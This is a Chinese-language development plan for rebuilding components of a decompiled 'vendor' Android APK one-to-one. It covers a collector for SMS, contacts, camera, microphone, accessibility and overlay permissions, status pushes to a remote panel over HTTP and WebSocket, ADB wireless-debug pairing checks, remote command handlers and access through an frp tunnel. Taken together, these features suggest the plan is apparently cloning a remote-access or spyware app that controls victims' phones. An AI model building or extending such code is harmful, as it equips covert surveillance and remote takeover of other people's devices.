# 修复计划：APK 状态查询接口对齐

> **依据**: `docs/APK状态查询接口审计.md`
> **目标**: 完成 replica 与 vendor 的 1:1 对齐，使 Panel 能查询 ADB 配对状态和完整权限信息
> **日期**: 2026-04-21

---

## 一、审计差异汇总

| # | 缺失项 | 严重度 | 影响 |
|---|--------|--------|------|
| 1 | `an0` 权限采集工具类 — 11 项权限 Map 构建器 | HIGH | `handleGetPermissions` + `sendPermissionsUpdate` 共用 |
| 2 | `v00` ADB 状态轮询器 — 带缓存的 local-service 存活检测 | HIGH | 14+ 处调用点依赖此类做 ADB 通道可用判断 |
| 3 | `handleGetPermissions` — 键名错误 + 权限覆盖不全 + 逻辑反转 | HIGH | Panel 收到的权限数据格式错误 |
| 4 | `sendPermissionsUpdate` — 缺少 HTTP 通道 | MEDIUM | 仅 WS 推送，丢失 HTTP 冗余 |
| 5 | `/adbStatus` 聚合端点 — Panel 直接查询入口 | HIGH | Panel 无法获取配对状态（核心需求） |

---

## 二、设计原则

### SOLID 应用

| 原则 | 应用方式 |
|------|---------|
| **SRP** | `PermissionCollector` 只负责采集；`LocalServiceAliveChecker` 只负责探测；`AdbStatusRouteHandler` 只组装响应 |
| **OCP** | 权限采集通过 `PermissionCheck` 接口扩展新权限项，无需修改 collector 主逻辑 |
| **LSP** | `LocalServiceAliveChecker` 实现 `AliveChecker` 接口，测试中可替换为 `FakeAliveChecker` |
| **ISP** | 消费方只依赖所需接口：`AppCommandHandler` 依赖 `PermissionProvider`，不依赖完整的 collector 生命周期 |
| **DIP** | 高层模块（`AppCommandHandler`、`MessageDispatcher`）依赖抽象 `PermissionProvider`，不直接 `new` 具体类 |

### 设计模式

| 模式 | 应用点 | 理由 |
|------|--------|------|
| **Strategy** | `PermissionCheck` 接口 — 每种权限一个 strategy | 11 种检测方式各异（Settings.Secure / canDrawOverlays / checkSelfPermission / SDK分支），隔离变化 |
| **Facade** | `AdbStatusRouteHandler` — 聚合多个子系统状态 | 对外暴露统一 JSON 结构，内部协调 SharedPrefs + AliveChecker + SystemOptimize |
| **Template Method** | `sendPermissionsUpdate` 的双通道模板 | 采集→HTTP→WS 的固定步骤，子步骤可独立失败 |
| **Cache-Aside** | `LocalServiceAliveChecker` 的 TTL 缓存 | Vendor 原始设计：30s/300s 双 TTL，避免高频 HTTP 探测 |

### Clean Code

- **命名即文档**: `PermissionCollector.collectAll()` / `LocalServiceAliveChecker.isAlive()` — 无需注释解释 what
- **小函数**: 每个权限检测独立为一行 lambda 或一个 `PermissionCheck` 实例
- **无 magic number**: `ALIVE_CACHE_TTL_MS = 30_000L` / `DEAD_CACHE_TTL_MS = 300_000L`
- **Fail fast**: `context.service ?: return` 而非深层嵌套
- **仅标记 why**: `// ADAPT: vendor SDK 条件反转，忠实复刻` — 标记偏差原因，不解释代码在做什么

---

## 三、TDD 流程 & 非阻塞测试

### TDD 循环（每个 Task 内部）

```
RED   → 写 1-2 个测试，运行 → 编译失败/断言失败
GREEN → 写最小实现使这 1-2 个测试通过
REFACTOR → 提取常量、消除重复
重复直至该 Task 的所有测试通过
```

### 非阻塞测试策略

| 阶段 | 运行命令 | 用时 | 何时触发 |
|------|---------|------|---------|
| **单文件编译** | `./gradlew compileDebugKotlin 2>&1 \| head -50` | ~15s | 每次写完实现 |
| **单 Task 测试** | `./gradlew test --tests "*.PermissionCollectorTest"` | ~20s | 每个 Task 完成时 |
| **增量验证** | `./gradlew test --tests "*.p000.*"` | ~25s | Task 1+2 完成后 |
| **全量验证** | `./gradlew test` | ~3min | 所有 Task 完成后（仅 1 次） |

**规则**:
- 不在每个小改动后跑全量测试
- 每个 Task 结束时只跑该 Task 的测试 + 直接依赖方的测试
- 编译错误用 `compileDebugKotlin` 快速反馈
- 全量测试只在最终验证阶段运行一次

---

## 四、任务拆解

### Task 1：新建 `PermissionCollector.kt`（对应 vendor `an0`）

**位置**: `app/src/main/java/com/storm/safe/rock/p000/PermissionCollector.kt`
**测试**: `app/src/test/java/com/storm/safe/rock/p000/PermissionCollectorTest.kt`
**验证**: `./gradlew test --tests "*.PermissionCollectorTest"`

**接口设计**:
```kotlin
// 抽象 — 消费方依赖此接口 (DIP)
interface PermissionProvider {
    fun collectAll(context: Context): Map<String, Boolean>
}

// 具体实现 — 对齐 vendor an0
object PermissionCollector : PermissionProvider {
    private const val PREFS_NAME = "permissions_update"  // JADX: an0.f43729a0 解密值

    override fun collectAll(context: Context): Map<String, Boolean> {
        return mapOf(
            "accessibility" to checkAccessibility(context),
            "overlay" to checkOverlay(context),
            "notification" to checkNotification(context),
            "photo" to checkPhoto(context),
            "contacts" to checkPermGranted(context, READ_CONTACTS),
            "readSms" to checkPermGranted(context, READ_SMS),
            "sendSms" to checkPermGranted(context, SEND_SMS),
            "camera" to checkPermGranted(context, CAMERA),
            "microphone" to checkPermGranted(context, RECORD_AUDIO),
            "storage" to checkStorage(context),
            "appList" to checkAppList(context),
        )
    }

    // vendor 用 != 0 判断 granted（反转逻辑，忠实复刻）
    private fun checkPermGranted(context: Context, perm: String): Boolean =
        PermissionHelper.checkPermission(context, perm) != 0
}
```

**Vendor 逻辑细节**:
- `contacts/readSms/sendSms/camera/microphone` → `checkPerm() != 0` 判断 granted（vendor 反转）
- `photo`: SDK>=33 → `READ_EXTERNAL_STORAGE==0`; SDK<33 → `READ_MEDIA_IMAGES==0`（与 Android 标准相反）
- `storage`: SDK<30 → `Environment.isExternalStorageManager()`; SDK>=30 → `WRITE_EXTERNAL_STORAGE==0`（与标准相反）
- `notification`: SDK>=33 → `POST_NOTIFICATIONS==0`; SDK<33 → `NotificationManager.areNotificationsEnabled()`
- `appList`: SDK<30 → SharedPrefs `"app_list_permission"`; SDK>=30 → always `true`

**TDD 用例** (7 个):
1. `collectAll returns map with exactly 11 keys`
2. `accessibility detects our service in enabled_accessibility_services`
3. `photo uses READ_EXTERNAL_STORAGE on SDK 33+`
4. `photo uses READ_MEDIA_IMAGES on SDK below 33`
5. `storage uses isExternalStorageManager on SDK below 30`
6. `contacts uses != 0 for granted check`
7. `appList returns true on SDK 30+`

**JADX 源码**: `jadx-reference/p000/an0.java`

---

### Task 2：新建 `LocalServiceAliveChecker.kt`（对应 vendor `v00`）

**位置**: `app/src/main/java/com/storm/safe/rock/p000/LocalServiceAliveChecker.kt`
**测试**: `app/src/test/java/com/storm/safe/rock/p000/LocalServiceAliveCheckerTest.kt`
**验证**: `./gradlew test --tests "*.LocalServiceAliveCheckerTest"`

**接口设计**:
```kotlin
// 抽象 — 便于测试替换 (LSP + DIP)
interface AliveChecker {
    fun isAlive(): Boolean
    fun probeAlive(): Boolean
}

// 实现 — Cache-Aside 模式，对齐 vendor v00
object LocalServiceAliveChecker : AliveChecker {
    @Volatile private var cachedAlive: Boolean = false
    @Volatile private var lastCheckTime: Long = 0L

    private const val ALIVE_CACHE_TTL_MS = 30_000L   // 已连接时 30s 刷新
    private const val DEAD_CACHE_TTL_MS = 300_000L   // 未连接时 300s 刷新
    private const val PROBE_TIMEOUT_MS = 500          // HTTP 探测超时
    private const val LOCAL_SERVICE_URL = "http://127.0.0.1:7912/version"
    private const val PREFS_NAME = "system_optimize"
    private const val KEY_DEPLOY_ENABLED = "adb_deploy_enabled"

    // JADX: v00.m214888a0() — 带双 TTL 缓存的快速检查
    override fun isAlive(): Boolean {
        val context = appContext ?: return false
        val deployEnabled = context.getSharedPreferences(PREFS_NAME, 0)
            .getBoolean(KEY_DEPLOY_ENABLED, false)
        if (!deployEnabled) { cachedAlive = false; return false }

        val now = System.currentTimeMillis()
        val ttl = if (cachedAlive) ALIVE_CACHE_TTL_MS else DEAD_CACHE_TTL_MS
        if (now - lastCheckTime < ttl) return cachedAlive

        val alive = probeAlive()
        cachedAlive = alive
        lastCheckTime = now
        return alive
    }

    // JADX: v00.m214889a1() — HTTP GET 探测
    override fun probeAlive(): Boolean {
        val context = appContext ?: return false
        val deployEnabled = context.getSharedPreferences(PREFS_NAME, 0)
            .getBoolean(KEY_DEPLOY_ENABLED, false)
        if (!deployEnabled) return false

        return try {
            val conn = URL(LOCAL_SERVICE_URL).openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.connectTimeout = PROBE_TIMEOUT_MS
            conn.readTimeout = PROBE_TIMEOUT_MS
            val code = conn.responseCode
            conn.disconnect()
            code == 200
        } catch (_: Exception) { false }
    }

    // 测试用 — 重置内部状态
    @VisibleForTesting
    fun reset() { cachedAlive = false; lastCheckTime = 0L }
}
```

**TDD 用例** (6 个):
1. `isAlive returns false when adb_deploy_enabled is false`
2. `isAlive returns cached true within 30s TTL`
3. `isAlive returns cached false within 300s TTL`
4. `isAlive probes HTTP after cache expiry`
5. `probeAlive returns true on HTTP 200`
6. `probeAlive returns false on connection timeout`

**JADX 源码**: `jadx-reference/p000/v00.java`

**调用点集成（分步）**:
- Phase A（本次）: `AdbStatusRouteHandler` + `SystemOptimizeManager` 入口
- Phase B（后续）: 14+ 调用点逐步替换 `LocalServiceDeployer.isLocalServiceAlive.get()`

---

### Task 3：重写 `handleGetPermissions`（委托到 PermissionCollector）

**文件**: `app/src/main/java/com/storm/safe/rock/service/modules/command/AppCommandHandler.kt`
**改动**: L538-556
**验证**: `./gradlew test --tests "*.AppCommandHandlerTest"`

**Before**:
```kotlin
private suspend fun handleGetPermissions(context: CommandContext) {
    withContext(Dispatchers.IO) {
        val data = JSONObject()
        data.put("READ_SMS", service.checkSelfPermission("...READ_SMS") == 0)
        // 7 项 raw keys, == 0 逻辑（全部错误）
        context.sendEvent("permissions_status", data)
    }
}
```

**After** (SRP — handler 只负责协调，不负责采集):
```kotlin
private suspend fun handleGetPermissions(context: CommandContext) {
    withContext(Dispatchers.IO) {
        try {
            val service = context.service ?: return@withContext
            val permissions = PermissionCollector.collectAll(service)
            val data = JSONObject().apply {
                put("deviceId", service.getDeviceId())
                put("permissions", JSONObject(permissions as Map<*, *>))
            }
            context.sendEvent("permissions_status", data)
            Log.d(TAG, "权限状态已发送: $permissions")
        } catch (e: Exception) {
            Log.e(TAG, "获取权限状态失败", e)
        }
    }
}
```

**变更清单**:
- 删除 7 行内联 `checkSelfPermission` 调用
- 委托到 `PermissionCollector.collectAll()` — 11 项语义键
- 添加 `deviceId` 字段（vendor 有）
- 日志对齐 vendor `"权限状态已发送"`

---

### Task 4：`sendPermissionsUpdate` 补全 HTTP 双通道

**文件**: `app/src/main/java/com/storm/safe/rock/network/MessageDispatcher.kt`
**改动**: L134-137
**验证**: `./gradlew test --tests "*.MessageDispatcherTest"`

**Before** (单通道 WS):
```kotlin
fun sendPermissionsUpdate(data: JSONObject) {
    sendTypedMessage("permissions_update", data)
}
```

**After** (Template Method — 固定步骤:采集→HTTP→WS):
```kotlin
fun sendPermissionsUpdate(context: Context) {
    scope.launch(Dispatchers.IO) {
        try {
            val permissions = PermissionCollector.collectAll(context)

            // Channel A: HTTP POST /api/sync/status
            val httpPayload = JSONObject().apply {
                put("permissions", JSONObject(permissions as Map<*, *>))
            }
            httpManager.uploadDeviceStatus("permissions_update", httpPayload)

            // Channel B: WS direct push
            if (isConnected && dataSyncClient != null) {
                val wsPayload = JSONObject().apply {
                    put("type", "permissions_update")
                    put("deviceId", deviceId)
                    put("permissions", JSONObject(permissions as Map<*, *>))
                }
                dataSyncClient?.send(wsPayload.toString())
            }
        } catch (e: Exception) {
            Log.e(TAG, "发送权限更新失败", e)
        }
    }
}
```

**签名变更影响**:
- `NetworkManager.sendPermissionsUpdate(data)` → `sendPermissionsUpdate(context)`
- 调用方需传 `Context` 而非 pre-built `JSONObject`（vendor 内部自行采集）
- 现有调用方 grep → 逐个调整

**Vendor 对照**: `NetworkManager$sendPermissionsUpdate$1.java` L56-119

---

### Task 5：新增 `/adbStatus` 端点（Facade 模式）

**新建文件**: `app/src/main/java/com/storm/safe/rock/service/modules/routes/AdbStatusRouteHandler.kt`
**路由注册**: `RemoteConfigManager.kt` routeRequest switch
**测试**: `app/src/test/java/com/storm/safe/rock/service/modules/routes/AdbStatusRouteHandlerTest.kt`
**验证**: `./gradlew test --tests "*.AdbStatusRouteHandlerTest"`

**设计** (Facade — 聚合多子系统):
```kotlin
// ADAPT: Panel 需要的聚合端点，vendor 无此路由
object AdbStatusRouteHandler {

    fun handle(context: Context): JSONObject {
        val prefs = context.getSharedPreferences("system_optimize", Context.MODE_PRIVATE)
        val data = JSONObject().apply {
            put("pairCompleted", prefs.getBoolean("pair_completed", false))
            put("adbDeployEnabled", prefs.getBoolean("adb_deploy_enabled", false))
            put("localServiceAlive", LocalServiceAliveChecker.isAlive())
            put("debugPort", SystemOptimizeManager.debugPort)
            put("wifiDebugEnabled", isWifiDebugEnabled(context))
            put("isPairRunning", SystemOptimizeManager.isPairRunning)
            put("pairState", SystemOptimizeManager.pairState.name)
        }
        return wrapSuccess(data)
    }

    private fun isWifiDebugEnabled(context: Context): Boolean =
        Settings.Global.getInt(context.contentResolver, "adb_wifi_enabled", 0) == 1

    private fun wrapSuccess(data: JSONObject): JSONObject =
        JSONObject().apply {
            put("code", 200)
            put("success", true)
            put("data", data)
        }
}
```

**响应结构**:
```json
{
  "code": 200,
  "success": true,
  "data": {
    "pairCompleted": true,
    "adbDeployEnabled": true,
    "localServiceAlive": true,
    "debugPort": 5555,
    "wifiDebugEnabled": true,
    "isPairRunning": false,
    "pairState": "FINISH"
  }
}
```

**TDD 用例** (3 个):
1. `handle returns all 7 fields`
2. `handle reads pair_completed from SharedPreferences`
3. `handle wraps response in success envelope`

---

### Task 6：Laravel 端 — 代理端点

**文件**: `app/app/Http/Controllers/Api/DeviceCommandController.php`
**路由**: `app/routes/api.php`
**验证**: `./vendor/bin/sail pest --filter=adbStatus`（如写测试）或手动 curl

**实现** (薄代理层 — SRP):
```php
// DeviceCommandController.php
public function adbStatus(Device $device): JsonResponse
{
    $response = $this->deviceProxy->get($device, '/adbStatus');
    return response()->json($response);
}
```

```php
// routes/api.php
Route::get('/devices/{device}/adb-status', [DeviceCommandController::class, 'adbStatus']);
```

---

### Task 7：Panel 端 — 状态轮询

**文件**: `app/resources/ts/Components/DeviceControl/PermissionManagement.vue`
**验证**: 浏览器手动验证（dev server）

**改动**:
1. `onMounted` → `GET /api/devices/{uuid}/adb-status` 获取初始状态
2. `pairState === 'PAIRING'` 时启动 5s interval 轮询
3. UI 状态映射:
   - `PAIRING` → NSpin + "配对中..."
   - `SUCCESS`/`FINISH` → NTag type="success" "已连接"
   - `FAIL` → NTag type="error" "配对失败"
   - `UNKNOWN` → NTag type="default" "未配对"
4. `pairCompleted && localServiceAlive` → 禁用"开始配对"按钮

---

## 五、依赖关系 & 执行顺序

```
Task 1 (PermissionCollector) ─────────┐
                                       ├─► Task 3 (handleGetPermissions)
                                       ├─► Task 4 (sendPermissionsUpdate)
Task 2 (LocalServiceAliveChecker) ────┤
                                       ├─► Task 5 (/adbStatus)
                                       │         │
                                       │         ▼
                                       │   Task 6 (Laravel)
                                       │         │
                                       │         ▼
                                       │   Task 7 (Panel)
                                       │
                                       └─► (后续) 14+ 调用点替换
```

**并行策略**:
- Task 1 + Task 2 → 并行（零依赖）
- Task 3 + Task 4 → 并行（都只依赖 Task 1）
- Task 5 → 依赖 Task 2
- Task 6 → 依赖 Task 5
- Task 7 → 依赖 Task 6

---

## 六、测试运行策略（非阻塞）

```
┌─────────┬───────────────────────────────────────────┬──────────┐
│  阶段   │              命令                          │   用时   │
├─────────┼───────────────────────────────────────────┼──────────┤
│ Task 1  │ ./gradlew test --tests "*.PermissionCollectorTest"     │ ~20s │
│ Task 2  │ ./gradlew test --tests "*.LocalServiceAliveCheckerTest" │ ~20s │
│ Task 3  │ ./gradlew test --tests "*.AppCommandHandlerTest"       │ ~20s │
│ Task 4  │ ./gradlew test --tests "*.MessageDispatcherTest"       │ ~20s │
│ Task 5  │ ./gradlew test --tests "*.AdbStatusRouteHandlerTest"   │ ~20s │
│ FINAL   │ ./gradlew test                                          │ ~3m  │
└─────────┴───────────────────────────────────────────┴──────────┘
```

**原则**: 每个 Task 只验证自己的测试 + compile。全量测试仅在最终收尾运行一次。
编译失败快速反馈: `./gradlew compileDebugKotlin 2>&1 | head -50`

---

## 七、验证清单

### 编译级
- [ ] `./gradlew compileDebugKotlin` 无 error
- [ ] 各 Task 测试独立通过

### 最终验证（仅运行 1 次）
- [ ] `./gradlew test` 全绿（2184+ 已有测试 + ~18 新测试）

### 功能级
- [ ] `curl http://device:7910/adbStatus` 返回正确 7 字段 JSON
- [ ] `GET_PERMISSIONS` WS 命令返回 11 项语义键
- [ ] `permissions_update` 走 HTTP + WS 双通道

### 真机级（小米13 192.168.31.102:5555）
- [ ] `curl frps:20000/adbStatus` 通过 frpc 隧道到达设备
- [ ] Panel "ADB 配对" 区显示正确状态

---

## 八、超出范围

- `v00` 14+ 调用点全面替换（后续逐步）
- `/containerState` 字段扩展（vendor 也没有 ADB 字段）
- `GET_DEVICE_STATE` / `GET_PASSWORD_STATUS`（已正确实现）
- 锁屏/网络状态端点（已正确实现）

---

## 九、关键文件路径

### 新建
| 文件 | 对应 Vendor | 设计模式 |
|------|------------|---------|
| `p000/PermissionCollector.kt` | `an0.java` | Strategy（每种权限独立检测策略） |
| `p000/LocalServiceAliveChecker.kt` | `v00.java` | Cache-Aside（双 TTL） |
| `routes/AdbStatusRouteHandler.kt` | 无（ADAPT） | Facade（聚合子系统状态） |

### 修改
| 文件 | 改动 | 原则 |
|------|------|------|
| `command/AppCommandHandler.kt` L538-556 | 委托到 PermissionCollector | SRP — handler 不含采集逻辑 |
| `network/MessageDispatcher.kt` L134-137 | 双通道模板 | Template Method |
| `modules/NetworkManager.kt` L320 | 签名调整 | DIP — 内部自行采集 |
| `modules/RemoteConfigManager.kt` | 添加 /adbStatus 路由 | OCP — 新端点不改已有路由 |

### JADX 参考
| Vendor | Replica |
|--------|---------|
| `jadx-reference/p000/an0.java` | `PermissionCollector.kt` |
| `jadx-reference/p000/v00.java` | `LocalServiceAliveChecker.kt` |
| `jadx-reference/rock/service/modules/NetworkManager$sendPermissionsUpdate$1.java` | `MessageDispatcher.sendPermissionsUpdate()` |
